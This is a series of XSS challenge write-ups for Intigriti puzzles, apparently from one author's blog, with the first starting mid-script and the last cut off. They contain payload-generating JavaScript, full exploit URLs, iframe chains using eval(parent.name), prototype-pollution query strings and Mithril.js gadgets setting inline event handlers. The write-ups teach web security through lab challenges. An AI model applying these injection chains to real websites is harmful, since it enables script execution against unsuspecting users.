[] let currentIndex = 0 let codeResult = '' for(let i=0; i&lt;5; i++) &#123; addFunction(`$&#123;arrName&#125;.pop`) &#125; const findMathName = (index, char) => findTargetFromScope(Math, item => item.name.at(index) === char, 'Math') for(let char of content) &#123; // if we can find it in the Math for the current index, use it let result = findMathName(currentIndex, char) if (result) &#123; addFunction(`$&#123;result&#125;.name.at`) addFunction(`$&#123;arrName&#125;.push`) currentIndex++ continue &#125; const mapping = [ ['Math.LN2.valueOf'], // 0 ['Math.LOG2E.valueOf'], // 1 ['Math.E.valueOf'], // 2 ['Math.PI.valueOf'], // 3 ] // try to find Math.fn[i] == char let found = false for(let i=0; i&lt;mapping.length; i++) &#123; result = findMathName(i, char) if (result) &#123; addFunction(mapping[i][0]) addFunction(`$&#123;result&#125;.name.at`) addFunction(`$&#123;arrName&#125;.push`) currentIndex++ found = true break &#125; &#125; if (found) &#123; continue &#125; // if we can't, we use integer to make a string let mathResult = findTargetNumber(currentIndex, char.charCodeAt(0)) mathResult.reverse() // remember to reverse cause the order for(let row of mathResult) &#123; addFunction(row) &#125; addFunction('Math.abs.name.constructor.fromCharCode') addFunction(`$&#123;arrName&#125;.push`) currentIndex++ &#125; // add eval structure // generate space then trim let spaceResult = findTargetNumber(currentIndex, ' '.charCodeAt(0)) spaceResult.reverse() // remember to reverse cause the order for(let row of spaceResult) &#123; addFunction(row) &#125; addFunction('Math.abs.name.constructor.fromCharCode') addFunction('Math.abs.name.constructor.prototype.trim.call') addFunction(`$&#123;arrName&#125;.join`) addFunction('Math.abs.constructor') addFunction('Math.abs.constructor.prototype.call.call') return ans.reverse().join(',') //return codeResult function addFunction(name)&#123; ans.unshift(name) codeResult = `$&#123;name&#125;($&#123;codeResult&#125;)` &#125; &#125; console.log(buildExploit('Math.seeds', 'alert(document.domain)')) The final result is: Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.abs.name.at,Math.seeds.push,Math.clz32.name.at,Math.seeds.push,Math.LN2.valueOf,Math.exp.name.at,Math.seeds.push,Math.LN2.valueOf,Math.round.name.at,Math.seeds.push,Math.hypot.name.at,Math.seeds.push,Math.clz32,Math.cosh,Math.log2,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cosh,Math.log,Math.cosh,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.cos.name.at,Math.seeds.push,Math.E.valueOf,Math.imul.name.at,Math.seeds.push,Math.LN2.valueOf,Math.max.name.at,Math.seeds.push,Math.LN2.valueOf,Math.exp.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.LN2.valueOf,Math.tan.name.at,Math.seeds.push,Math.log2,Math.exp,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.clz32,Math.sqrt,Math.cosh,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.max.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.at,Math.seeds.push,Math.LN2.valueOf,Math.imul.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.acosh,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cos,Math.clz32,Math.abs.name.constructor.fromCharCode,Math.abs.name.constructor.prototype.trim.call,Math.seeds.join,Math.abs.constructor,Math.abs.constructor.prototype.call.call Exploit URL: https://challenge-0823.intigriti.io/challenge/index.html?q=Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.abs.name.at,Math.seeds.push,Math.clz32.name.at,Math.seeds.push,Math.LN2.valueOf,Math.exp.name.at,Math.seeds.push,Math.LN2.valueOf,Math.round.name.at,Math.seeds.push,Math.hypot.name.at,Math.seeds.push,Math.clz32,Math.cosh,Math.log2,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cosh,Math.log,Math.cosh,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.cos.name.at,Math.seeds.push,Math.E.valueOf,Math.imul.name.at,Math.seeds.push,Math.LN2.valueOf,Math.max.name.at,Math.seeds.push,Math.LN2.valueOf,Math.exp.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.LN2.valueOf,Math.tan.name.at,Math.seeds.push,Math.log2,Math.exp,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.clz32,Math.sqrt,Math.cosh,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.max.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.at,Math.seeds.push,Math.LN2.valueOf,Math.imul.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.acosh,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cos,Math.clz32,Math.abs.name.constructor.fromCharCode,Math.abs.name.constructor.prototype.trim.call,Math.seeds.join,Math.abs.constructor,Math.abs.constructor.prototype.call.call Arbitrary XSSThe above code merely executes the static alert(document.domain) command. Is it possible to execute arbitrary JavaScript code? As long as a short enough payload can be found, it seems feasible. For instance, eval(location.hash.slice(1)) is relatively short, but still a bit long. If you use the script I provided above, it might hang for a while due to some bugs in my code. Ultimately, it generates a result of length 120, which exceeds the 100-character limit. However, another payload like eval(&quot;&#39;&quot;+location) works fine and has a length of 85. https://challenge-0823.intigriti.io/challenge/index.html?q=Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.exp.name.at,Math.seeds.push,Math.tan,Math.sinh,Math.sinh,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.atan.name.at,Math.seeds.push,Math.ceil.name.at,Math.seeds.push,Math.clz32,Math.cosh,Math.log2,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cosh,Math.cbrt,Math.cosh,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.exp,Math.tan,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.expm1,Math.sqrt,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cbrt,Math.cosh,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LN2.valueOf,Math.log.name.at,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.at,Math.seeds.push,Math.LN2.valueOf,Math.tan.name.at,Math.seeds.push,Math.LN2.valueOf,Math.imul.name.at,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.atan,Math.sinh,Math.cosh,Math.cosh,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cos,Math.clz32,Math.abs.name.constructor.fromCharCode,Math.abs.name.constructor.prototype.trim.call,Math.seeds.join,Math.abs.constructor,Math.abs.constructor.prototype.call.call#&#39;;alert(document.domain+&#39;/arb-xss&#39;) Once the ability to execute arbitrary code is achieved, the next step is to strive to identify the shortest possible set of operations. Code golf timeShortest XSS payloadWhile the previous payload eval(&quot;&#39;&quot;+location) is already quite short, for this challenge, there is an even shorter payload. I learned from @DrBrix that you can use eval(parent.name) to shorten the length further, and this clever technique leverages iframes. In the challenge page, a special name was set up to ensure it doesn’t get overwritten, but we can utilize it’s parent page. The page https://challenge-0823.intigriti.io/ embeds chanllenge/index.html using an iframe, so using parnent.name allows us to access the name of https://challenge-0823.intigriti.io/. Thus, @DrBrix’s strategy is as follows: First, create a page named exp.html, add an iframe with the name set to the payload, and replace the location with https://challenge-0823.intigriti.io. The structure becomes: - exp.html (top) --- https:&#x2F;&#x2F;challenge-0823.intigriti.io (name: &#39;alert(1)&#39;) ------ https:&#x2F;&#x2F;challenge-0823.intigriti.io&#x2F;challenge&#x2F;index.html Then you can use frames[0].frames[0] to access the innermost iframe and redirect it to the prepared URL, resulting in: - exp.html (top) --- https:&#x2F;&#x2F;challenge-0823.intigriti.io (name: &#39;alert(1)&#39;) ------ https:&#x2F;&#x2F;challenge-0823.intigriti.io&#x2F;challenge&#x2F;index.html?q&#x3D;... This way, you can use parent.name to access the adjusted name. The code looks like this: &lt;script> setTimeout(() => &#123; frames[0].frames[0].location.replace('https://challenge-0823.intigriti.io/challenge/index.html?q=Math.random') &#125;,3000)&lt;/script> &lt;iframe srcdoc=' &lt;script> name = \"alert(document.domain)\" document.location = \"https://challenge-0823.intigriti.io/\" &lt;/script> '> &lt;/iframe> eval(parent.name) is the shortest payload I could find. The second shortest is location=parent.name. Empty Math.seedsPreviously, Math.seeds.pop() was used to clear the content, but this part can be further shortened! @y0d3n introduced a technique: Math.seeds.splice(Math.imul()). This works because the return value of Math.imul() is 0, and splice(0) means “remove data after(and include) the first element.” Therefore, the entire array is cleared. Get an empty stringPreviously, I used a more convoluted method to generate an empty string. Later, I discovered that Math.random.name could yield an empty string. This is due to this part: Math.random = function () &#123; if (!this.seeds) &#123; this.seeds = [0.62536, 0.458483, 0.544523, 0.323421, 0.775465] next = this.seeds[new Date().getTime() % this.seeds.length] &#125; next = next * 1103515245 + 12345 return (next / 65536) % 32767 &#125; Notice there’s no name after function, making it an anonymous function. So, we’re assigning an anonymous function to Math.random, hence Math.random.name becomes an empty string. Obtaining fixed numbersI previously used built-in constants like Math.PI to obtain fixed numbers. Later, I learned from @Astrid that we can use forms like STRING.length.valueOf() to get numbers. For example, Math.isPrototypeOf.name.length.valueOf() would yield 13. Using this method, we can quickly obtain a fixed number. Once we have a fixed number, we can find our desired number with fewer steps, and @Astrid even wrote code to find the shortest path. Final solutionThe resulting payload is composed of 59 operations and executes eval(parent.name)(this requires collaboration with the previously mentioned iframe to run). Math.imul,Math.seeds.splice,Math.exp.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.constructor.prototype.valueOf.name.at,Math.seeds.push,Math.atan.name.at,Math.seeds.push,Math.ceil.name.at,Math.seeds.push,Math.isPrototypeOf.name.length.valueOf,Math.log2,Math.exp,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LN2.valueOf,Math.pow.name.at,Math.seeds.push,Math.abs.name.constructor.fromCharCode.name.at,Math.seeds.push,Math.abs.name.constructor.fromCharCode.name.at,Math.seeds.push,Math.abs.name.constructor.prototype.normalize.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.constructor.prototype.normalize.name.at,Math.seeds.push,Math.abs.name.constructor.prototype.codePointAt.name.at,Math.seeds.push,Math.PI.valueOf,Math.exp,Math.acosh,Math.exp,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.constructor.prototype.normalize.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.at,Math.seeds.push,Math.LN2.valueOf,Math.max.name.at,Math.seeds.push,Math.LN2.valueOf,Math.exp.name.at,Math.seeds.push,Math.asinh,Math.log2,Math.tan,Math.cosh,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.random.name.valueOf,Math.seeds.join,Math.abs.constructor,Math.abs.constructor.prototype.call.call The script is as follows: function findTargetFromScope(scope, matchFn, initPath='') &#123; let visited = new Set() let result = [] findTarget(scope, initPath) // return the shortest one return result.sort((a, b) => a.length - b.length)[0] function findTarget(obj, path) &#123; if(visited.has(obj)) return visited.add(obj) const list = Object.getOwnPropertyNames(obj) for(let key of list) &#123; const item = obj[key] const newPath = path ? path + \".\" + key : key try &#123; if (matchFn(item)) &#123; result.push(newPath) continue &#125; &#125; catch(err)&#123;&#125; if (item &amp;&amp; typeof item === 'object') &#123; findTarget(item, newPath) &#125; &#125; &#125; &#125; function findTargetNumber(init, target) &#123; let queue = [[[], init]] let visited = new Set() return bfs(target) function bfs(target) &#123; while(queue.length) &#123; let [path, current] = queue.shift() for(let key of Object.getOwnPropertyNames(Math))&#123; if (typeof Math[key] !== 'function') continue let value = Math[key]?.(current) if (value &amp;&amp; !Number.isNaN(value)) &#123; let newPath = [`Math.$&#123;key&#125;`, ...path] if (value === target) &#123; return newPath &#125; if (newPath.length >= 10) return if (!visited.has(value)) &#123; visited.add(value) queue.push([newPath, value]) &#125; &#125; &#125; &#125; &#125; &#125; function buildExploit(arrName, content) &#123; let ans = [] let currentIndex = 0 let codeResult = '' // @credit: @y0d3n addFunction('Math.imul') addFunction('Math.seeds.splice') const findMathName = (index, char) => findTargetFromScope(Math, item => item.name.at(index) === char, 'Math') || findTargetFromScope(Math.abs.name.constructor, item => item.name.at(index) === char, 'Math.abs.name.constructor') for(let char of content) &#123; console.log(char) // if we can find it in the Math for the current index, use it let result = findMathName(currentIndex, char) if (result) &#123; addFunction(`$&#123;result&#125;.name.at`) addFunction(`$&#123;arrName&#125;.push`) currentIndex++ continue &#125; const mapping = [ ['Math.LN2.valueOf'], // 0 ['Math.LOG2E.valueOf'], // 1 ['Math.E.valueOf'], // 2 ['Math.PI.valueOf'], // 3 ] // try to find Math.fn[i] == char let found = false for(let i=0; i&lt;mapping.length; i++) &#123; result = findMathName(i, char) if (char === 'v' &amp;&amp; !result) &#123; result = 'Math.LN2.valueOf' &#125; if (result) &#123; addFunction(mapping[i][0]) addFunction(`$&#123;result&#125;.name.at`) addFunction(`$&#123;arrName&#125;.push`) currentIndex++ found = true break &#125; &#125; if (found) &#123; continue &#125; // @credit: @Astrid if (char === '(') &#123; addFunction('Math.isPrototypeOf.name.length.valueOf') addFunction('Math.log2') addFunction('Math.exp') addFunction('Math.abs.name.constructor.fromCharCode') addFunction(`$&#123;arrName&#125;.push`) currentIndex++ &#125; else if (char === '.') &#123; addFunction('Math.PI.valueOf') addFunction('Math.exp') addFunction('Math.acosh') addFunction('Math.exp') addFunction('Math.abs.name.constructor.fromCharCode') addFunction(`$&#123;arrName&#125;.push`) currentIndex++ &#125; else &#123; let mathResult = findTargetNumber(currentIndex, char.charCodeAt(0)) mathResult.reverse() // remember to reverse cause the order for(let row of mathResult) &#123; addFunction(row) &#125; addFunction('Math.abs.name.constructor.fromCharCode') addFunction(`$&#123;arrName&#125;.push`) currentIndex++ &#125; &#125; // add eval structure addFunction('Math.random.name.valueOf') addFunction(`$&#123;arrName&#125;.join`) addFunction('Math.abs.constructor') addFunction('Math.abs.constructor.prototype.call.call') return ans.reverse() function addFunction(name)&#123; ans.unshift(name) codeResult = `$&#123;name&#125;($&#123;codeResult&#125;)` &#125; &#125; Math.seeds = [] // @credit: @DrBrix const arr = buildExploit('Math.seeds', 'eval(parent.name)') console.log('length:', arr.length) console.log(arr.join(',')) Perhaps there might be something even shorter, but I’m too lazy to search for it. ConclusionThe above is the solution to the challenge and the thought process behind it. Originally, the ideal situation was to find a usable array directly from Math, without needing Math.seeds. However, upon trying, it seems I couldn’t find such a solution. I’ve also learned a lot from other hackers’ solutions, like clearing the array or achieving even shorter payloads, things I didn’t anticipate when designing the challenge. Kudos to all the hackers! I hope that everyone has learned something from this challenge and had a great time participating. Thank you all for your participation, and I look forward to crossing paths again in future challenges!","link":"/2023/08/29/en/intigriti-0823-author-writeup/"},{"title":"Revenge of Intigriti 0422 Challenge Author Writeup","text":"Among the many web vulnerabilities, my favorite is prototype pollution. It can be powerful sometimes when you find a script gadget. So, I decided to make an XSS challenge about prototype pollution. In April, the challenge I made was released on Intigriti, if you haven’t checked that one, here is the link: https://challenge-0422.intigriti.io/ Making a good challenge is hard. I made a few mistakes. With the bugs I made, the challenge became much easier. To make up for it, I decided to make another one, called “The Revenge of Intigriti 0422 Challenge”. Below is the intended solution to the revenge challenge. Challenge URL: https://aszx87410.github.io/xss-challenge/revenge-of-intigriti-0422 SolutionTL;DR Pollute Array.prototype via merge function Bypass checkHost() and pollute Object.prototype via merge function Find a script gadget in Mithril.js XSS Step1. Prototype pollution on Array.prototypeStep2. Bypass checkHostThese two steps are the same as the previous one, you can find the detail in my previous writeup: Intigriti 0422 XSS Challenge Author Writeup Step3. Prototype pollution againStarting from step3, it’s totally different from the previous one. For previous one, you can override document.body.innerHTML to achieve XSS. But it does not work anymore because of the patch: - if (typeof data !&#x3D;&#x3D; &#39;string&#39;) return data + if (typeof data !&#x3D;&#x3D; &#39;string&#39;) data &#x3D; String(data) What else can we do? At second merge call, we have devSettings[&quot;root&quot;] = document.createElement(&#39;main&#39;), what can we do from a DOM element? The idea is, if we can find a property that property.constructor.prototype &#x3D;&#x3D;&#x3D; Object.prototype from this DOM element, we can pollute Object.prototype! How should we find such property? For me, I will try to start with either document or window, because it’s more likely to have it. First, we can get window object via document.querySelector(&#39;main&#39;).ownerDocument.defaultView Object is in the protectedKeys, so we can’t just pollute ownerDocument.defaultView.Object.constructor.prototype.xxx. It’s not a big problem, we can do a little fuzzing to find other properties to use: for(let key in window) &#123; if (window[key]?.constructor.prototype === Object.prototype) &#123; console.log(key) &#125; &#125; On Chrome, it’s styleMedia, webkitStorageInfo and chrome. On Firefox, it’s external and sidebar. By using these properties, we can pollute Object.prototype on both Chrome and Firefox // firefox settings[root][ownerDocument][defaultView][external][constructor][prototype][autofocus]=1 // chrome settings[root][ownerDocument][defaultView][chrome][constructor][prototype][autofocus]=1 It seesm complex, is there a simpler way? Yes! In JavaScript, every properties has a flag called enumerable, for in can only enumerate enumerable properties. If we want to get all the properties in an object, we should use Object.getOwnPropertyNames instead. for(let key of Object.getOwnPropertyNames(window)) &#123; if (window[key]?.constructor.prototype === Object.prototype) &#123; console.log(key) &#125; &#125; On Chrome, it’s: JSON Math Intl Reflect console CSS styleMedia webkitStorageInfo Atomics chrome WebAssembly On Firefox, it’s: JSON Math Intl Reflect Atomics WebAssembly CSS external sidebar netscape console If you see different results, it’s most likely because of the extension you have installed. For example, web3 or ethereum if you have metamask installed. Anyway, we can use JSON to construct our payload: settings[root][ownerDocument][defaultView][JSON][constructor][prototype][autofocus]&#x3D;1 Step4. Find prototype pollution gadget in mithril.jsAfter we can pollute Object.prototype, we need to find a script gadget to achieve XSS, and it’s exactly the final step of this challenge: find a prototype pollution gadget in mithril.js. Mithril.js is not a big project, the codebase is relatively small. Although it may take some time, finding a gadget is definitely possible. There is a type of usage that can be vulnerable to prototype pollution: for(let key in obj) &#123; // do something &#125; Why? Let’s see the following example: var obj = &#123;&#125; Object.prototype.a = 123 for(let key in obj) &#123; console.log(key) // a &#125; for in also iterates the properties of Object.prototype. So, we can start by finding such pattern. Here is the part for setting the DOM attributes: https://github.com/MithrilJS/mithril.js/blob/v2.0.4/render/render.js#L728 function setAttrs(vnode, attrs, ns) &#123; for (var key in attrs) &#123; setAttr(vnode, key, null, attrs[key], ns) &#125; &#125; The key here is that for in has been used, which means our polluted properties will be there as well. Now, we know that we can pollute DOM attribute, so our goal is to use an inline event handler like onfocus to trigger XSS. Keep diving in to see what setAttr does: https://github.com/MithrilJS/mithril.js/blob/v2.0.4/render/render.js#L733 function setAttr(vnode, key, old, value, ns) &#123; if (key === \"key\" || key === \"is\" || value == null || isLifecycleMethod(key) || (old === value &amp;&amp; !isFormAttribute(vnode, key)) &amp;&amp; typeof value !== \"object\") return if (key[0] === \"o\" &amp;&amp; key[1] === \"n\") return updateEvent(vnode, key, value) if (key.slice(0, 6) === \"xlink:\") vnode.dom.setAttributeNS(\"http://www.w3.org/1999/xlink\", key.slice(6), value) else if (key === \"style\") updateStyle(vnode.dom, old, value) else if (hasPropertyKey(vnode, key, ns)) &#123; if (key === \"value\") &#123; // Only do the coercion if we're actually going to check the value. /* eslint-disable no-implicit-coercion */ //setting input[value] to same value by typing on focused element moves cursor to end in Chrome if ((vnode.tag === \"input\" || vnode.tag === \"textarea\") &amp;&amp; vnode.dom.value === \"\" + value &amp;&amp; vnode.dom === activeElement()) return //setting select[value] to same value while having select open blinks select dropdown in Chrome if (vnode.tag === \"select\" &amp;&amp; old !== null &amp;&amp; vnode.dom.value === \"\" + value) return //setting option[value] to same value while having select open blinks select dropdown in Chrome if (vnode.tag === \"option\" &amp;&amp; old !== null &amp;&amp; vnode.dom.value === \"\" + value) return /* eslint-enable no-implicit-coercion */ &#125; // If you assign an input type that is not supported by IE 11 with an assignment expression, an error will occur. if (vnode.tag === \"input\" &amp;&amp; key === \"type\") vnode.dom.setAttribute(key, value) else vnode.dom[key] = value &#125; else &#123; if (typeof value === \"boolean\") &#123; if (value) vnode.dom.setAttribute(key, \"\") else vnode.dom.removeAttribute(key) &#125; else vnode.dom.setAttribute(key === \"className\" ? \"class\" : key, value) &#125; &#125; If a property name starts with on, updateEvent will be called and it takes a function as parameters, no way to inject a string handler. We can use ON instead of on to bypass this. Another thing we need to get around is this check: hasPropertyKey(vnode, key, ns) If this returns true, it executes vnode.dom[key] = value in the end. It’s not what we want because vnode.dom[&#39;ONCLICK&#39;] = &#39;alert(1)&#39; makes no effect. The only way to add a inline event handler to the DOM element is to let hasPropertyKey(vnode, key, ns) failed and then run vnode.dom.setAttribute(key === &quot;className&quot; ? &quot;class&quot; : key, value), for example: &lt;html lang=\"en\"> &lt;head> &lt;meta charset=\"utf-8\"> &lt;/head> &lt;body> &lt;div id=a>click me&lt;/div> &lt;script> // this works a.setAttribute('ONCLICK', 'alert(1)') &lt;/script> &lt;/body> &lt;/html> Now, our goal is to fail hasPropertyKey(vnode, key, ns) and make it returns false: https://github.com/MithrilJS/mithril.js/blob/v2.0.4/render/render.js#L815 function hasPropertyKey(vnode, key, ns) &#123; // Filter out namespaced keys return ns === undefined &amp;&amp; ( // If it's a custom element, just keep it. vnode.tag.indexOf(\"-\") > -1 || vnode.attrs != null &amp;&amp; vnode.attrs.is || // If it's a normal element, let's try to avoid a few browser bugs. key !== \"href\" &amp;&amp; key !== \"list\" &amp;&amp; key !== \"form\" &amp;&amp; key !== \"width\" &amp;&amp; key !== \"height\"// &amp;&amp; key !== \"type\" // Defer the property check until *after* we check everything. ) &amp;&amp; key in vnode.dom &#125; It returns false if ns is not undefined. But wait, where is this ns comes from? Here is the code: https://github.com/MithrilJS/mithril.js/blob/v2.0.4/render/render.js#L15 function getNameSpace(vnode) &#123; return vnode.attrs &amp;&amp; vnode.attrs.xmlns || nameSpace[vnode.tag] &#125; It’s from vnode.attrs.xmlns, so we can pollute this attribute. In order to not affect other functionalities, we can use the default namespace for HTML: http://www.w3.org/1999/xhtml To piece all the puzzles together, following is a simple proof-of-concept: const App = &#123; view: function() &#123; return m(\"input\", &#123;class: 'a'&#125;,\"hello\") &#125; &#125; Object.prototype.xmlns = 'http://www.w3.org/1999/xhtml' Object.prototype.autofocus = 1 Object.prototype.ONFOCUS = 'alert(1)' m.mount(document.querySelector('main'), App) To sum up, we need to: Pollute Array.prototype[1] to bypass checkHost() check Pollute a few properties on Object.prototype including xmlns, autofocus and ONFOCUS to perform XSS As what I said in the beginning, the challenge is all about prototype pollution! Here is what we need in the end: ?config[window-toolbar][constructor][prototype][1]&#x3D;8080&amp;settings[root][ownerDocument][defaultView][JSON][constructor][prototype][autofocus]&#x3D;1&amp;settings[root][ownerDocument][defaultView][JSON][constructor][prototype][ONFOCUS]&#x3D;alert(document.domain)&amp;settings[root][ownerDocument][defaultView][JSON][constructor][prototype][xmlns]&#x3D;http%3A%2F%2Fwww.w3.org%2F1999%2Fxhtml URL: https://aszx87410.github.io/xss-challenge/revenge-of-intigriti-0422?config[window-toolbar][constructor][prototype][1]=8080&amp;settings[root][ownerDocument][defaultView][JSON][constructor][prototype][autofocus]=1&amp;settings[root][ownerDocument][defaultView][JSON][constructor][prototype][ONFOCUS]=alert(document.domain)&amp;settings[root][ownerDocument][defaultView][JSON][constructor][prototype][xmlns]=http%3A%2F%2Fwww.w3.org%2F1999%2Fxhtml Other script gadgetsBesides the above gadget, some players also find another one. const App = &#123; view: function() &#123; return m(\"div\", &#123;class: 'a'&#125;,\"hello\") &#125; &#125; Object.prototype.tag = 'img' Object.prototype.src = '1' Object.prototype.img = 'http://www.w3.org/1999/xhtml' Object.prototype.attrs = '' Object.prototype.Onerror = 'alert(1)' m.mount(document.querySelector('main'), App) It creates a new element from nothing by polluting Object.prototype.tag. The rest part is similar with the intended gadget. And also this cool gadget found by @lbrnli1234: const App = &#123; view: function() &#123; return m(\"div\", &#123;class: 'a'&#125;,\"hello\") &#125; &#125; Object.prototype.tag = 'style' Object.prototype.attrs = '' String.prototype.Onerror = 'alert(1)' m.mount(document.querySelector('main'), App) Unintended(for the previous one, not revenge challenge)#1 Unintended but fixed solutionBefore the original challenge has released to the public, @PinkDraconian gave early access to the other four players for private testing. At that time, there is no sanitize function, and root is added to DOM before Mithril.js. To my surprise, one player found an unintended solution: settings[root][outerHTML]=&lt;input autofocus onfocus=alert(document.domain)> It works because you can assign any value to the DOM in the merge function. I was too focused on prototype pollution to find this unintended, thanks again to the player for finding it before the challenge was released to the public. Also, this attack surface creates more other ways to the unintended because one can access document and window, like: document.body.innerHTML = '&lt;svg onload=alert(1)>' document.location.href = 'javascript:alert(1)' window.location.href = 'javascript:alert(1)' To prevent this, I added a sanitize function to filter dangerous characters, hoping to close the door for injecting arbitrary HTML. But, as you know, I failed. So I try to fix it again and release this revenge challenge. #2 Unintended but not fixed solutionAfter the patch, I found another interesting unintended solution. Remember that we can set the value for any attributes on document? We can set document.domain to intigriti.io and then leverage another challenge from a different subdomain! If both subdomains set their domain to intigriti.io, they can interact with each other as if they are same-origin! See MDN docs for more detail. For example, we can: Use XSS in challenge-0222.intigriti.io, change document.domain to intigriti.io Add an iframe to embed challenge-0422.intigriti.io, also set document.domain via config query string It’s same-origin now, we can perform XSS on challege-0422 from challenge-0222. Code: document.domain='intigriti.io'; a=document.createElement('iframe'); a.src='https://challenge-0422.intigriti.io/challenge/Window Maker.html?config[window-toolbar][constructor][prototype][1]=8080&amp;settings[root][ownerDocument][domain]=intigriti.io'; document.body.appendChild(a); a.onload=function()&#123; setTimeout(()=>&#123; a.contentWindow.document.body.innerHTML='&lt;style onload=alert(document.domain)>'; // we need to change it back a.contentWindow.document.domain='challenge-0422.intigriti.io' &#125;,1000) &#125; PoC URL: https:&#x2F;&#x2F;challenge-0222.intigriti.io&#x2F;challenge&#x2F;xss.html?q&#x3D;%3Cstyle%20onload&#x3D;eval(uri)%3E&amp;first&#x3D;yes#%0adocument.domain&#x3D;%27intigriti.io%27;a&#x3D;document.createElement(%27iframe%27);a.src&#x3D;%27https:&#x2F;&#x2F;challenge-0422.intigriti.io&#x2F;challenge&#x2F;Window%20Maker.html?config[window-toolbar][constructor][prototype][1]&#x3D;8080&amp;settings[root][ownerDocument][domain]&#x3D;intigriti.io%27;document.body.appendChild(a);a.onload&#x3D;function()%7BsetTimeout(() &#x3D;&gt; &#123;a.contentWindow.document.body.innerHTML&#x3D;&#39;&lt;style onload&#x3D;alert(document.domain)&gt;&#39;;a.contentWindow.document.domain&#x3D;&#39;challenge-0422.intigriti.io&#39;&#125;,1000)&#125; I talked with @PinkDraconian about this fantastic solution, we decided not to fix it and only accept the first report. As far as I know, no one has submitted this kind of solution. In the revenge challenge, I exclude this solution by adding a rule saying that: Should not leverage other challenges on the same domain. By the way, it will be no longer possible from Chrome 106: https://developer.chrome.com/blog/immutable-document-domain/ Takeaways Prototype pollution is powerful Making a good challenge is hard Now, I know how the author feels when they saw my unintended","link":"/2022/05/02/en/intigriti-revenge-challenge-author-writeup/"},{"title":"Intigriti July XSS Challenge: Breaking Through Multiple Levels","text":"IntroductionIntigriti holds an XSS challenge every month, giving you a week to solve an XSS problem with the goal of successfully executing alert(document.domain). As a front-end security engineer, I participate every month (but not necessarily solve it). Below are my notes from the previous months: Experience of Solving Intigriti’s 0421 XSS Challenge (Part 1) Intigriti’s 0521 XSS Challenge Solution: Limited Character Combination Code Intigriti June XSS Challenge Review Each month’s challenge is quite interesting, and I think the difficulty is well controlled. It’s not super difficult, but it’s not easy to solve right away either. I also found this month’s challenge very fun, so after solving it, I wrote this article to share my experience with everyone, hoping that more and more people can participate. Challenge URL: https://challenge-0721.intigriti.io/ Analyzing the ProblemIf you look closely, you’ll find that this challenge is a bit more complicated because there are three pages and a bunch of postMessage and onmessage events, which takes some time to figure out their relationship. After looking at it, I decided to start from the opposite direction because it’s an XSS problem, which means there must be a place to execute code, usually eval or innerHTML, so I can find it first and then figure out how to get there. Next, let’s take a brief look at the three pages: index.html htmledit.php console.php index.html&lt;div class=\"card-container\"> &lt;div class=\"card-header-small\">Your payloads:&lt;/div> &lt;div class=\"card-content\"> &lt;script> // redirect all htmledit messages to the console onmessage = e =>&#123; if (e.data.fromIframe)&#123; frames[0].postMessage(&#123;cmd:\"log\",message:e.data.fromIframe&#125;, '*'); &#125; &#125; /* var DEV = true; var store = &#123; users: &#123; admin: &#123; username: 'inti', password: 'griti' &#125;, moderator: &#123; username: 'root', password: 'toor' &#125;, manager: &#123; username: 'andrew', password: 'hunter2' &#125;, &#125; &#125; */ &lt;/script> &lt;div class=\"editor\"> &lt;span id=\"bin\"> &lt;a onclick=\"frames[0].postMessage(&#123;cmd:'clear'&#125;,'*')\">🗑️&lt;/a> &lt;/span> &lt;iframe class=console src=\"./console.php\">&lt;/iframe> &lt;iframe class=codeFrame src=\"./htmledit.php?code=&lt;img src=x>\">&lt;/iframe> &lt;textarea oninput=\"this.previousElementSibling.src='./htmledit.php?code='+escape(this.value)\">&lt;img 